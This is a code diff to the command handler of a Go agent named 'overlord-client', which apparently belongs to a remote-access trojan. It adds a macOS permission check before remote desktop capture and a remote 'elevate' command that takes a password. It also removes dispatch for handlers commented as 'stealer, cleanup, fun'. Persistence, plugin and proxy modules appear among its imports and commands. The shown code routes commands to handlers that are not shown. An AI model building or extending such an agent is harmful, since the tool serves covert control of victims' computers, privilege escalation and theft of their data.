@@ -22,6 +22,7 @@ import (
 	"overlord-client/cmd/agent/persistence"
 	"overlord-client/cmd/agent/plugins"
 	"overlord-client/cmd/agent/runtime"
+	"overlord-client/cmd/agent/sysinfo"
 	"overlord-client/cmd/agent/wire"
 )
 
@@ -560,6 +561,26 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: pluginId, Event: "unloaded"})
 		return nil
 	case "desktop_start":
+		if goruntime.GOOS == "darwin" {
+			perms := sysinfo.DarwinPermissions()
+			var missing []string
+			if !perms["screenRecording"] {
+				missing = append(missing, "screenRecording")
+			}
+			if !perms["accessibility"] {
+				missing = append(missing, "accessibility")
+			}
+			if len(missing) > 0 {
+				log.Printf("desktop: macOS missing permissions: %v", missing)
+				detail, _ := json.Marshal(map[string]interface{}{
+					"reason":      "permissions_denied",
+					"missing":     missing,
+					"permissions": perms,
+				})
+				sendCommandResultSafe(env, cmdID, false, string(detail))
+				return nil
+			}
+		}
 		env.DesktopMu.Lock()
 		if env.DesktopCancel != nil {
 			env.DesktopCancel()
@@ -1922,6 +1943,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
 		_ = wire.WriteMsg(ctx, env.Conn, res)
 		return ErrReconnect
+	case "elevate":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		password, _ := payload["password"].(string)
+		return HandleElevate(ctx, env, cmdID, password)
 	case "proxy_connect":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		return HandleProxyConnect(ctx, env, cmdID, payload)
@@ -1930,27 +1955,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return HandleProxyData(ctx, env, cmdID, payload)
 	case "proxy_close":
 		return HandleProxyClose(ctx, env, cmdID)
-
-	// ── Local-only commands (stealer, cleanup, fun) ──
-	case "steal":
-		go func() {
-			defer recoverAndLog("steal handler", nil)
-			HandleSteal(ctx, env, cmdID, envelope)
-		}()
-		return nil
-	case "cleanup":
-		go func() {
-			defer recoverAndLog("cleanup handler", nil)
-			HandleCleanup(ctx, env, cmdID)
-		}()
-		return nil
-	case "fun":
-		go func() {
-			defer recoverAndLog("fun handler", nil)
-			HandleFun(ctx, env, cmdID, envelope)
-		}()
-		return nil
-
 	default:
 		log.Printf("command: unknown action=%s", action)
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "unknown command"}
